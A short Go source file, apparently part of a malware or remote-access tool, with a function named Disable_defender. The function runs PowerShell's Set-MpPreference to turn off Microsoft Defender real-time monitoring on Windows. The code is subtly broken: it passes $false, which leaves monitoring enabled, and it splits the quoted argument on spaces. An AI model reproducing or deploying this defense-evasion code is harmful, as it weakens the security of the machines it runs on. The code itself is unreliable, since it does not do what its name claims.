package powershell

import (
	"os/exec"
	"runtime"
	"strings"
)

func Disable_defender() {
	if runtime.GOOS == "windows" {
		arg := "-command \"Set-MpPreference -DisableRealtimeMonitoring $false\""
		exec.Command("powershell", strings.Split(arg, " ")...).Run()
	}
}
